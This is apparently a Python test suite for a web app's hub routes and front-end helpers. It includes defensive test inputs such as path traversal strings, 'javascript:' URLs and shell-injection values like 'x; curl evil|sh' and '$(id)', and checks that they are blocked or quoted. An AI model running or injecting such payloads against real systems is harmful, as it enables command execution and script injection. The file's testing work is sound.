"""The web app on the hub: /app/ pages and /v1/app/* data."""

import json
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

from quiver.webapp import static
from quiver.webapp.api import WebApp

from tests.test_remote_hub import HubBase


class TestAssetNames(unittest.TestCase):
    def test_only_flat_known_files(self):
        self.assertTrue(static.is_asset_name("index.html"))
        self.assertTrue(static.is_asset_name("harness-claude-color.svg"))
        for bad in ("../hub.py", "..", "a/b.js", "nope.js", "static.py", "", ".hidden.css"):
            self.assertFalse(static.is_asset_name(bad), bad)


class TestWebAppRoutes(HubBase):
    def setUp(self):
        super().setUp()
        self.srv.state.webapp = WebApp(self.srv.home, download_prices=False)
        proj = self.srv.home / ".claude" / "projects" / "p"
        proj.mkdir(parents=True)
        (proj / "a.jsonl").write_text(json.dumps({
            "timestamp": "2026-10-03T10:00:00Z", "sessionId": "s", "requestId": "r",
            "message": {"id": "m", "model": "claude-opus-5",
                        "usage": {"input_tokens": 1000, "output_tokens": 10}},
        }) + "\n")

    def test_pages_are_public_and_confined(self):
        status, body = self.srv.request("GET", "/app/")
        self.assertEqual(status, 200)
        self.assertIn(b"/app/app.js", body)
        self.assertIn(b"/app/model-menu.js", body)
        for path in ("/app/app.js", "/app/format.js", "/app/model-menu.js", "/app/styles.css",
                     "/app/harness-devin.svg"):
            self.assertEqual(self.srv.request("GET", path)[0], 200, path)
        self.assertEqual(self.srv.request("GET", "/app")[0], 301)
        for path in ("/app/../hub.py", "/app/%2e%2e/hub.py", "/app/api.py", "/app/x/y.js"):
            self.assertEqual(self.srv.request("GET", path)[0], 404, path)
        # The remote PWA's own routes are gone; ``/`` lands here.
        self.assertEqual(self.srv.request("GET", "/app.js")[0], 404)
        self.assertEqual(self.srv.request("GET", "/")[0], 301)

    def test_overview_needs_a_device_and_reads_the_ledger(self):
        self.assertEqual(self.srv.request("GET", "/v1/app/overview")[0], 401)
        status, data = self.srv.request(
            "GET", "/v1/app/overview?period=all&tz=UTC", headers=self.auth())
        self.assertEqual(status, 200, data)
        body = json.loads(data)
        self.assertEqual(body["period"], "all")
        self.assertEqual(body["totals"]["tokens"], 1010)
        self.assertGreater(body["totals"]["cost_usd"], 0)
        self.assertEqual(body["harnesses"][0]["harness"], "claude")
        self.assertEqual(body["machine"], self.srv.state.machine["name"])
        self.assertEqual(body["notes"], [])
        # No shared AGENTS.md yet: Overview offers setup until there is one.
        self.assertTrue(body["first_run"])
        agents = self.srv.home / ".quiver/AGENTS.md"
        agents.parent.mkdir(parents=True, exist_ok=True)
        agents.write_text("# shared\n")
        body = json.loads(self.srv.request(
            "GET", "/v1/app/overview?period=all&tz=UTC", headers=self.auth())[1])
        self.assertFalse(body["first_run"])
        # The store is the web app's own, never the Mac app's.
        self.assertTrue((self.srv.home / ".quiver/data/web-ledger/ledger.sqlite").exists())
        self.assertFalse((self.srv.home / ".quiver/data/ledger").exists())


APP_JS = Path(__file__).resolve().parents[1] / "src/quiver/webapp/static/app.js"


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestSetupOffer(unittest.TestCase):
    """app.js's first-run offer, run under node with the browser stubbed:
    each case is a fresh page load at ``hash``."""

    def offer(self, hash_, body, stored=None, storage_throws=False):
        storage = ("{ getItem() { throw new Error('blocked'); }, setItem() { throw new Error('blocked'); } }"
                   if storage_throws else
                   "{ m: new Map(Object.entries(" + json.dumps(stored or {}) + ")),"
                   " getItem(k) { return this.m.has(k) ? this.m.get(k) : null; },"
                   " setItem(k, v) { this.m.set(k, String(v)); } }")
        prelude = (
            "const listeners = {};\n"
            "globalThis.window = { addEventListener(t, f) { (listeners[t] ||= []).push(f); } };\n"
            "globalThis.document = { addEventListener() {} };\n"
            "globalThis.location = { hash: " + json.dumps(hash_) + " };\n"
            "globalThis.localStorage = " + storage + ";\n"
            # Every listener but route(), which needs the page's DOM.
            "const fire = (t) => (listeners[t] || []).filter((f) => f !== route).forEach((f) => f());\n"
            # Pages app.js names that sessions.js and manage.js define.
            "function renderSessions() {} function renderHarnesses() {} function renderAccounts() {}\n")
        with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as f:
            f.write(prelude + APP_JS.read_text(encoding="utf-8")
                    + "\nprocess.stdout.write(JSON.stringify((() => {" + body + "})()));\n")
        self.addCleanup(Path(f.name).unlink)
        done = subprocess.run(["node", f.name], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    FIRST = "const d = { first_run: true };"
    RESULT = "({ went, hash: location.hash, offered: localStorage.getItem('quiver.setup.offered') })"

    def test_a_bare_landing_opens_setup_once(self):
        out = self.offer("", self.FIRST + "const went = offerSetupOnce(d);"
                         " const again = offerSetupOnce(d); return { ...(" + self.RESULT + "), again };")
        self.assertEqual(out, {"went": True, "hash": "#/setup", "offered": "1", "again": False})

    def test_a_saved_offer_stays_on_overview(self):
        out = self.offer("", self.FIRST + "const went = offerSetupOnce(d); return " + self.RESULT + ";",
                         stored={"quiver.setup.offered": "1"})
        self.assertEqual(out, {"went": False, "hash": "", "offered": "1"})

    def test_a_link_to_overview_is_not_redirected(self):
        for hash_ in ("#/overview", "#/overview?x=1"):
            out = self.offer(hash_, self.FIRST + "const went = offerSetupOnce(d); return " + self.RESULT + ";")
            self.assertEqual(out, {"went": False, "hash": hash_, "offered": None}, hash_)

    def test_leaving_before_overview_answers_spends_the_offer(self):
        out = self.offer("", self.FIRST + "location.hash = '#/sessions'; fire('hashchange');"
                         " const went = offerSetupOnce(d); return " + self.RESULT + ";")
        self.assertEqual(out, {"went": False, "hash": "#/sessions", "offered": None})

    def test_a_set_up_machine_or_blocked_storage_never_redirects(self):
        out = self.offer("", "const went = offerSetupOnce({ first_run: false }); return " + self.RESULT + ";")
        self.assertEqual(out, {"went": False, "hash": "", "offered": None})
        out = self.offer("", self.FIRST + "return { went: offerSetupOnce(d), hash: location.hash };",
                         storage_throws=True)
        self.assertEqual(out, {"went": False, "hash": ""})

    def test_overview_shows_the_card_only_on_first_run(self):
        out = self.offer("#/overview", "return [setupCard({ first_run: true, machine: '<b>box</b>' }),"
                         " setupCard({ first_run: false, machine: 'box' })];")
        self.assertIn('href="#/setup"', out[0])
        self.assertIn("Set up &lt;b&gt;box&lt;/b&gt;", out[0])
        self.assertEqual(out[1], "")


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestMacOnlySidebar(unittest.TestCase):
    """app.js's sidebar and router for the Mac-only pages (Menu bar,
    Widgets), run under node with a two-element DOM stubbed."""

    def run_route(self, hash_):
        prelude = (
            "globalThis.window = { addEventListener() {} };\n"
            "globalThis.document = { addEventListener() {}, getElementById(id) { return els[id]; },"
            " querySelectorAll: () => [] };\n"
            "const els = { sidebar: { innerHTML: '', querySelector: () => ({ outerHTML: '<div class=\"brand\"></div>' }) },"
            " panel: { innerHTML: '' } };\n"
            "globalThis.location = { hash: " + json.dumps(hash_) + " };\n"
            "const replaced = [];\n"
            "globalThis.history = { replaceState(_s, _t, url) { replaced.push(url); location.hash = url; } };\n"
            "globalThis.localStorage = { getItem() { return null; }, setItem() {} };\n"
            "function renderSessions() {} function renderHarnesses() {} function renderAccounts() {}\n"
            "const sessionsPage = { gen: 0 }, harnessesPage = { gen: 0 }, accountsPage = { gen: 0 };\n")
        body = ("const rendered = []; PAGES.overview = (id) => rendered.push(id);"
                " route(); return { rendered, replaced, hash: location.hash,"
                " sidebar: els.sidebar.innerHTML, panel: els.panel.innerHTML };")
        with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as f:
            f.write(prelude + APP_JS.read_text(encoding="utf-8")
                    + "\nprocess.stdout.write(JSON.stringify((() => {" + body + "})()));\n")
        self.addCleanup(Path(f.name).unlink)
        done = subprocess.run(["node", f.name], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_mac_only_items_wear_the_pill_and_are_not_links(self):
        sidebar = self.run_route("#/overview")["sidebar"]
        for page, label in (("menubar", "Menu bar"), ("widgets", "Widgets")):
            item = sidebar[sidebar.rindex('<span class="nav-item', 0, sidebar.index(f"<span>{label}</span>")):]
            item = item[:item.index("Mac app only</span></span>")]
            self.assertTrue(item.startswith('<span class="nav-item soon mac-only" data-page="%s" aria-disabled="true">' % page), item)
            self.assertNotIn("href", item)
            self.assertIn('<span class="badge mac-only">', item)
        self.assertNotIn('href="#/menubar"', sidebar)
        self.assertNotIn('href="#/widgets"', sidebar)
        # A page that isn't ported yet is still a link. Every row carries
        # data-page, which Settings' hide switches select on.
        self.assertIn('data-page="status" href="#/status"', sidebar)
        self.assertEqual(sidebar.count("data-page="), sidebar.count('class="nav-item'))

    def test_a_mac_only_hash_opens_overview(self):
        for hash_ in ("#/menubar", "#/widgets", "#widgets", "#/menubar?x=1"):
            out = self.run_route(hash_)
            self.assertEqual(out["rendered"], ["overview"], hash_)
            self.assertEqual(out["replaced"], ["#/overview"], hash_)
            self.assertIn('aria-current="page"', out["sidebar"])
            self.assertIn('class="nav-item active " data-page="overview" href="#/overview"', out["sidebar"])
            self.assertNotIn("part of the Mac app", out["panel"])

    def test_other_hashes_are_left_alone(self):
        for hash_ in ("", "#/overview"):
            out = self.run_route(hash_)
            self.assertEqual((out["rendered"], out["replaced"]), (["overview"], []), hash_)



@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestBodySheets(unittest.TestCase):
    """bodySheet puts a page's sheet on document.body, once, so a #panel
    repaint can't remove it; route() closes it on every navigation."""

    def test_made_once_on_body_and_closed_by_any_route(self):
        prelude = (
            "globalThis.window = { addEventListener() {} };\n"
            "const body = [], panel = { innerHTML: '' }, stubs = {};\n"
            "const sidebar = { innerHTML: '', querySelector: () => ({ outerHTML: '' }) };\n"
            "globalThis.document = { addEventListener() {}, body: { appendChild: (el) => body.push(el) },\n"
            "  createElement: (tag) => ({ tag, dataset: {}, open: false, attrs: {},\n"
            "    setAttribute(k, v) { this.attrs[k] = v; }, showModal() { this.open = true; },\n"
            "    close() { this.open = false; this.closed = (this.closed || 0) + 1; } }),\n"
            "  getElementById: (id) => (id === 'panel' ? panel : id === 'sidebar' ? sidebar\n"
            "    : body.find((e) => e.id === id) || (id.startsWith('pair-') ? (stubs[id] ||= {}) : null)),\n"
            "  querySelectorAll: (sel) => (sel === 'dialog[data-route-sheet][open]'\n"
            "    ? body.filter((e) => 'routeSheet' in e.dataset && e.open) : []) };\n"
            "globalThis.location = { hash: '#/skills' };\n"
            "globalThis.localStorage = { getItem: () => null };\n"
            "function renderSessions() {} function renderHarnesses() {} function renderAccounts() {}\n"
            "const sessionsPage = { gen: 0 }, harnessesPage = { gen: 0 }, accountsPage = { gen: 0 };\n")
        body = (
            "PAGES.skills = () => {};\n"
            "const a = bodySheet('sk-new-sheet', 'sheet sk-new-sheet', 'New skill');\n"
            "const again = bodySheet('sk-new-sheet', 'other') === a;\n"
            "const idle = bodySheet('sk-sheet', 'sheet');\n"
            "a.showModal(); route();\n"
            "idle.showModal(); renderGate('Revoked.');\n"
            "process.stdout.write(JSON.stringify({ count: body.length, again, cls: a.className,\n"
            "  label: a.attrs['aria-label'], open: a.open, closed: a.closed, idleClosed: idle.closed || 0,\n"
            "  gateClosed: !idle.open }));\n")
        done = subprocess.run(["node", "-e", prelude + APP_JS.read_text(encoding="utf-8") + "\n" + body],
                              capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertEqual(json.loads(done.stdout), {"count": 2, "again": True, "cls": "sheet sk-new-sheet",
                                                   "label": "New skill", "open": False, "closed": 1,
                                                   "idleClosed": 1, "gateClosed": True})

    def test_pages_keep_no_sheet_inside_the_panel(self):
        """Skills and Plugins used to draw their sheets into #panel, where a
        repaint deleted them; Plugins reopened its sheet on a later visit."""
        for page in ("skills", "plugins", "hooks"):
            src = (APP_JS.parent / "pages" / f"{page}.js").read_text(encoding="utf-8")
            self.assertNotIn("<dialog", src, page)



@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestGateLead(unittest.TestCase):
    """renderGate's lead line: the refusal message only while a credential
    is stored, unless the caller keeps it (Settings after "Revoke this
    browser", which has just dropped the credential)."""

    def lead(self, call, stored):
        prelude = (
            "globalThis.window = { addEventListener() {} };\n"
            "const els = {};\n"
            "globalThis.document = { addEventListener() {}, querySelectorAll: () => [],"
            " getElementById: (id) => (els[id] ||= { innerHTML: '' }) };\n"
            "globalThis.location = { hash: '' };\n"
            "globalThis.localStorage = { getItem: () => " + json.dumps(stored) + " };\n"
            "function renderSessions() {} function renderHarnesses() {} function renderAccounts() {}\n")
        src = (prelude + APP_JS.read_text(encoding="utf-8") + "\n" + call
               + ";\nprocess.stdout.write(els.panel.innerHTML.match(/<p>([^<]*)<\\/p>/)[1]);\n")
        done = subprocess.run(["node", "-e", src], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return done.stdout

    def test_lead(self):
        cred = json.dumps({"credential": "c"})
        self.assertEqual(self.lead('renderGate("Revoked.")', cred), "Revoked.")
        self.assertIn("needs pairing", self.lead('renderGate("Revoked.")', None))
        self.assertEqual(self.lead('renderGate("Signed out.", true)', None), "Signed out.")

@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestSafeHref(unittest.TestCase):
    """safeHref: a URL that came from GitHub, a tracker, a status feed or
    a plugin's manifest becomes a link only when it is http(s) or mailto,
    so a ``javascript:`` one can't run in the app's origin on a click."""

    def hrefs(self, urls):
        prelude = ("globalThis.window = { addEventListener() {} };\n"
                   "globalThis.document = { addEventListener() {} };\n"
                   "globalThis.location = { hash: '' };\n"
                   "function renderSessions() {} function renderHarnesses() {} function renderAccounts() {}\n")
        src = (prelude + APP_JS.read_text(encoding="utf-8")
               + "\nprocess.stdout.write(JSON.stringify(" + json.dumps(urls) + ".map(safeHref)));\n")
        done = subprocess.run(["node", "-e", src], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_web_and_mail_links_pass_escaped(self):
        self.assertEqual(self.hrefs(["https://github.com/a/b/pull/1", " HTTP://x.dev/?a=1&b=\"2\"", "mailto:me@x.dev"]),
                         ["https://github.com/a/b/pull/1", "HTTP://x.dev/?a=1&amp;b=&quot;2&quot;", "mailto:me@x.dev"])

    def test_script_and_other_schemes_are_dropped(self):
        self.assertEqual(self.hrefs(["javascript:alert(1)", " JavaScript:alert(1)", "java\tscript:alert(1)",
                                     "data:text/html,<b>x", "vbscript:x", "//evil.dev", "", None]),
                         [""] * 8)

    def test_pages_link_outside_urls_only_through_it(self):
        """No page builds an href from server data with plain esc(); the
        one esc() href left is Hooks' own in-app route."""
        static = APP_JS.parent
        hits = [f"{p.name}:{n}" for p in sorted([*static.glob("*.js"), *static.glob("pages/*.js")])
                for n, line in enumerate(p.read_text(encoding="utf-8").splitlines(), 1)
                if 'href="${esc(' in line]
        self.assertEqual([h.split(":")[0] for h in hits], ["hooks.js"], hits)


FORMAT_JS = APP_JS.with_name("format.js")


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestShellWord(unittest.TestCase):
    """Fmt.shellWord: the attach and resume lines people paste into a
    shell quote anything that isn't a plain word."""

    def word(self, value):
        src = (FORMAT_JS.read_text(encoding="utf-8")
               + "\nprocess.stdout.write(JSON.stringify(Fmt.shellWord("
               + json.dumps(value) + ")));\n")
        done = subprocess.run(["node", "-e", src], capture_output=True,
                              text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_plain_words_stay_bare(self):
        for value in ("qv-0123abcd", "claude", "/a/b-c.d", "--resume=x"):
            self.assertEqual(self.word(value), value)

    def test_shell_syntax_is_single_quoted(self):
        self.assertEqual(self.word("x; curl evil|sh"), "'x; curl evil|sh'")
        self.assertEqual(self.word("$(id)"), "'$(id)'")
        self.assertEqual(self.word("it's"), "'it'\\''s'")
        self.assertEqual(self.word(""), "''")


if __name__ == "__main__":
    unittest.main()
